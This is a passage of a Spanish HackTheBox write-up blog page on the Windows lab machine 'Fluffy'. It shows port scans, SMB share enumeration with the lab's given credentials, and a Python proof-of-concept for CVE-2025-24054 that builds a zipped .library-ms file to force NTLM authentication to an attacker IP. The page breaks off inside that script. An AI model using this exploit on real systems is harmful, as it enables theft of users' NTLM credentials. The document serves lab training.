@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Fluffy Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina de nivel easy de la plataforma HackTheBox, en la cual involucra Active Directory">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Fluffy Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina de nivel easy de la plataforma HackTheBox, en la cual involucra Active Directory">
+
+<meta property="og:url" content="https://celero0.github.io/posts/fluffy/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Fluffy Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina de nivel easy de la plataforma HackTheBox, en la cual involucra Active Directory">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-10-10T05:56:37+00:00">
+    <meta property="article:modified_time" content="2026-10-10T05:56:37+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/fluffy/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/fluffy/">
+              Fluffy Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-10-10T05:56:37Z">
+                October 10, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              16-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Windows #Easy #AD #ADCS</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Este writeup documenta la resolución de la máquina Windows <strong>Fluffy</strong> en HackTheBox. El entorno simula una brecha asumida en Active Directory, partiendo con credenciales válidas de un usuario de bajo privilegio.</p>
+<p>El acceso inicial se obtiene abusando de permisos de escritura sobre un recurso compartido SMB, donde se encuentran archivos que permiten preparar un ataque de coerción NTLM mediante <strong>CVE-2025-24054</strong> (identificada originalmente como CVE-2025-24071). Esto permite capturar el desafío-respuesta NTLMv2 de un segundo usuario del dominio, cuya contraseña es posteriormente recuperada mediante un ataque de diccionario.</p>
+<p>Con las nuevas credenciales, se enumeran las ACLs del dominio y se identifica un abuso de permisos <code>GenericAll</code> sobre un grupo administrativo, lo que permite unirse a él y heredar permisos <code>GenericWrite</code> sobre varias cuentas de servicio. Mediante ataques de <em>Shadow Credentials</em> se compromete una de estas cuentas, obteniendo acceso remoto y la flag de usuario.</p>
+<p>Finalmente, se explota una mala configuración en <strong>Active Directory Certificate Services (ADCS)</strong> correspondiente a <strong>ESC16</strong>, donde la extensión de seguridad SID se encuentra deshabilitada en la CA. Esto permite suplantar la identidad del usuario Administrador mediante la manipulación del <code>userPrincipalName</code> y la solicitud de un certificado, obteniendo control total del dominio.</p>
+<h1 id="información-previa">
+  Información previa
+  <a class="heading-link" href="#informaci%c3%b3n-previa">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como es común en pentests reales de Windows, comenzaremos la máquina <strong>Fluffy</strong> con credenciales para la siguiente cuenta:</p>
+<p>Usuario: <code>j.fleischman</code><br>
+Contraseña: <code>J0elTHEM4n1990!</code>.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>El escaneo de puertos revela servicios típicos de un entorno Windows con Active Directory, incluyendo DNS, Kerberos, LDAP y SMB.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.232.88 -oG allPorts
+</span></span></code></pre></div><p>Escaneando los servicios y las versiones que corren en los puertos encontrados anteriormente, se obtienen los siguientes resultados</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49696,49712,49725 -sCV 10.129.232.88 -oN portServices
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.99 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-10-09 22:28 -0400
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.129.232.88
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.15s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#ff7b72;font-weight:bold">(</span>server time: 2026-10-10 09:27:15Z<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m34s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-04-30T16:09:59
+</span></span><span style="display:flex;"><span>|_Not valid after:  2106-04-30T16:09:59
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-04-30T16:09:59
+</span></span><span style="display:flex;"><span>|_Not valid after:  2106-04-30T16:09:59
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m35s from scanner time.
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-04-30T16:09:59
+</span></span><span style="display:flex;"><span>|_Not valid after:  2106-04-30T16:09:59
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m34s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#ff7b72;font-weight:bold">(</span>Domain: fluffy.htb, Site: Default-First-Site-Name<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2026-10-10T09:28:46+00:00; +6h58m35s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+</span></span><span style="display:flex;"><span>| Not valid before: 2026-04-30T16:09:59
+</span></span><span style="display:flex;"><span>|_Not valid after:  2106-04-30T16:09:59
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#ff7b72;font-weight:bold">(</span>SSDP/UPnP<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49690/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49696/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49712/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49725/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2026-10-10T09:28:07
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h58m34s, deviation: 0s, median: 6h58m33s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3.1.1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 99.80 seconds
+</span></span></code></pre></div><p>En el resultado del escaneo, podemos ver el nombre de dominio <code>fluffy.htb</code>, además encontramos el nombre del <code>DomainController</code> <code>dc01</code>, por lo cual procedemos a agregarlo a nuestro <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#39;10.129.232.88 DC01 DC01.fluffy.htb fluffy.htb&#39;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><h1 id="enumeración-smb">
+  Enumeración SMB
+  <a class="heading-link" href="#enumeraci%c3%b3n-smb">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Primeramente probamos las credenciales proporcionadas inicialmente, para confirmar que estas sean válidas</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb fluffy.htb -u <span style="color:#a5d6ff">&#39;j.fleischman&#39;</span> -p <span style="color:#a5d6ff">&#39;J0elTHEM4n1990!&#39;</span>
+</span></span></code></pre></div><p>y tenemos como resultado que el dominio acepta las credenciales</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             <span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Windows <span style="color:#a5d6ff">10</span> / Server <span style="color:#a5d6ff">2019</span> Build <span style="color:#a5d6ff">17763</span> <span style="color:#ff7b72;font-weight:bold">(</span>name:DC01<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>domain:fluffy.htb<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>signing:True<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>SMBv1:None<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>Null Auth:True<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             <span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> fluffy.htb<span style="color:#79c0ff">\j</span>.fleischman:J0elTHEM4n1990!
+</span></span></code></pre></div><p>Ahora podemos revisar si nuestro usuario tiene acceso a algún recurso compartido por <code>SMB</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb fluffy.htb -u <span style="color:#a5d6ff">&#39;j.fleischman&#39;</span> -p <span style="color:#a5d6ff">&#39;J0elTHEM4n1990!&#39;</span> --shares
+</span></span></code></pre></div><p>El usuario posee acceso de lectura a los compartidos por defecto del dominio (<strong>IPC$, NETLOGON y SYSVOL</strong>), y además al recurso compartido <code>IT</code>, en el cual tiene permisos de <em>Lectura</em> y <em>Escritura</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             <span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Windows <span style="color:#a5d6ff">10</span> / Server <span style="color:#a5d6ff">2019</span> Build <span style="color:#a5d6ff">17763</span> <span style="color:#ff7b72;font-weight:bold">(</span>name:DC01<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>domain:fluffy.htb<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>signing:True<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>SMBv1:None<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>Null Auth:True<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             <span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> fluffy.htb<span style="color:#79c0ff">\j</span>.fleischman:J0elTHEM4n1990! 
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             <span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             IT              READ,WRITE      
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             NETLOGON        READ            Logon server share 
+</span></span><span style="display:flex;"><span>SMB         10.129.232.88   <span style="color:#a5d6ff">445</span>    DC01             SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>Por lo cual accedemos al recurso <code>IT</code> con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.129.232.88/IT -U <span style="color:#a5d6ff">&#39;fluffy.htb\j.fleischman%J0elTHEM4n1990!&#39;</span>
+</span></span></code></pre></div><p>Nos encontramos con diferentes archivos y directorios interesantes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#79c0ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#a5d6ff">0</span>  Sat Oct <span style="color:#a5d6ff">10</span> 06:04:34 <span style="color:#a5d6ff">2026</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#a5d6ff">0</span>  Sat Oct <span style="color:#a5d6ff">10</span> 06:04:34 <span style="color:#a5d6ff">2026</span>
+</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64           D        <span style="color:#a5d6ff">0</span>  Fri Apr <span style="color:#a5d6ff">18</span> 11:08:44 <span style="color:#a5d6ff">2025</span>
+</span></span><span style="display:flex;"><span>  Everything-1.4.1.1026.x64.zip       A  <span style="color:#a5d6ff">1827464</span>  Fri Apr <span style="color:#a5d6ff">18</span> 11:04:05 <span style="color:#a5d6ff">2025</span>
+</span></span><span style="display:flex;"><span>  KeePass-2.58                        D        <span style="color:#a5d6ff">0</span>  Fri Apr <span style="color:#a5d6ff">18</span> 11:08:38 <span style="color:#a5d6ff">2025</span>
+</span></span><span style="display:flex;"><span>  KeePass-2.58.zip                    A  <span style="color:#a5d6ff">3225346</span>  Fri Apr <span style="color:#a5d6ff">18</span> 11:03:17 <span style="color:#a5d6ff">2025</span>
+</span></span><span style="display:flex;"><span>  Upgrade_Notice.pdf                  A   <span style="color:#a5d6ff">169963</span>  Sat May <span style="color:#a5d6ff">17</span> 10:31:07 <span style="color:#a5d6ff">2025</span>
+</span></span></code></pre></div><p>Por lo cual procedemos a crear el directorio <code>IT</code>, donde almacenaremos los archivos, y los descargamos todos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir IT
+</span></span><span style="display:flex;"><span>cd IT/
+</span></span><span style="display:flex;"><span>smbclient //10.129.232.88/IT -U <span style="color:#a5d6ff">&#39;fluffy.htb\j.fleischman%J0elTHEM4n1990!&#39;</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#79c0ff">\&gt;</span> mask <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#79c0ff">\&gt;</span> prompt off
+</span></span><span style="display:flex;"><span>smb: <span style="color:#79c0ff">\&gt;</span> recurse on
+</span></span><span style="display:flex;"><span>smb: <span style="color:#79c0ff">\&gt;</span> mget *
+</span></span><span style="display:flex;"><span>getting file <span style="color:#79c0ff">\E</span>verything-1.4.1.1026.x64.zip of size <span style="color:#a5d6ff">1827464</span> as Everything-1.4.1.1026.x64.zip <span style="color:#ff7b72;font-weight:bold">(</span>479.6 KiloBytes/sec<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>average 479.6 KiloBytes/sec<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#79c0ff">\K</span>eePass-2.58.zip of size <span style="color:#a5d6ff">3225346</span> as KeePass-2.58.zip <span style="color:#ff7b72;font-weight:bold">(</span>507.3 KiloBytes/sec<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>average 496.9 KiloBytes/sec<span style="color:#ff7b72;font-weight:bold">)</span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>exit
+</span></span></code></pre></div><p>Con los archivos ya en nuestra máquina atacante, podemos leer <code>Upgrade_Notice.pdf</code>, el cual contiene un anuncio interno de FLUFFY sobre la aplicación obligatoria de parches de seguridad para vulnerabilidades divulgadas durante 2025.</p>
+<img src="/images/Pasted image 20261010001656.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>El documento está dirigido al departamento de TI e indica que los administradores deben identificar los sistemas afectados, reservar una ventana de mantenimiento en el sistema de gestión de cambios y aplicar las actualizaciones correspondientes.</p>
+<p>Entre las vulnerabilidades mencionadas se encuentran:</p>
+<img src="/images/Pasted image 20261010001707.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si investigamos las dos vulnerabilidades clasificadas como críticas, la más relevante sería la <code>CVE-2025-24071</code>. Esta vulnerabilidad permite que, dependiendo del contexto y de cómo se procese un archivo especialmente diseñado, Windows intente autenticarse contra un recurso remoto. De esta forma, un atacante podría capturar el <code>desafío-respuesta NTLMv2</code> del usuario que interactúa con el archivo.</p>
+<p><strong>NOTA:</strong> El número del CVE fue cambiado por Microsoft, el CVE que corresponde ahora a esa vulnerabilidad es <code>CVE-2025-24054</code>.</p>
+<p>Si buscamos por algún <code>POC</code> de la vulnerabilidad, encontramos el siguiente script en Python.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">zipfile</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">main</span>():
+</span></span><span style="display:flex;"><span>    file_name <span style="color:#ff7b72;font-weight:bold">=</span> input(<span style="color:#a5d6ff">&#34;Enter your file name: &#34;</span>)
+</span></span><span style="display:flex;"><span>    ip_address <span style="color:#ff7b72;font-weight:bold">=</span> input(<span style="color:#a5d6ff">&#34;Enter IP (EX: 192.168.1.162): &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    library_content <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&lt;libraryDescription xmlns=&#34;http://schemas.microsoft.com/windows/2009/library&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">  &lt;searchConnectorDescriptionList&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    &lt;searchConnectorDescription&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">      &lt;simpleLocation&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">        &lt;url&gt;</span><span style="color:#79c0ff">\\\\</span><span style="color:#a5d6ff">{</span>ip_address<span style="color:#a5d6ff">}</span><span style="color:#79c0ff">\\</span><span style="color:#a5d6ff">shared&lt;/url&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">      &lt;/simpleLocation&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    &lt;/searchConnectorDescription&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">  &lt;/searchConnectorDescriptionList&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&lt;/libraryDescription&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    library_file_name <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;</span><span style="color:#a5d6ff">{</span>file_name<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">.library-ms&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">with</span> open(library_file_name, <span style="color:#a5d6ff">&#34;w&#34;</span>, encoding<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;utf-8&#34;</span>) <span style="color:#ff7b72">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#ff7b72;font-weight:bold">.</span>write(library_content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">with</span> zipfile<span style="color:#ff7b72;font-weight:bold">.</span>ZipFile(<span style="color:#a5d6ff">&#34;exploit.zip&#34;</span>, mode<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;w&#34;</span>, compression<span style="color:#ff7b72;font-weight:bold">=</span>zipfile<span style="color:#ff7b72;font-weight:bold">.</span>ZIP_DEFLATED) <span style="color:#ff7b72">as</span> zipf:
+</span></span><span style="display:flex;"><span>        zipf<span style="color:#ff7b72;font-weight:bold">.</span>write(library_file_name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> os<span style="color:#ff7b72;font-weight:bold">.</span>path<span style="color:#ff7b72;font-weight:bold">.</span>exists(library_file_name):
+</span></span><span style="display:flex;"><span>        os<span style="color:#ff7b72;font-weight:bold">.</span>remove(library_file_name)
+</span></span><span style="display:flex;"><span>
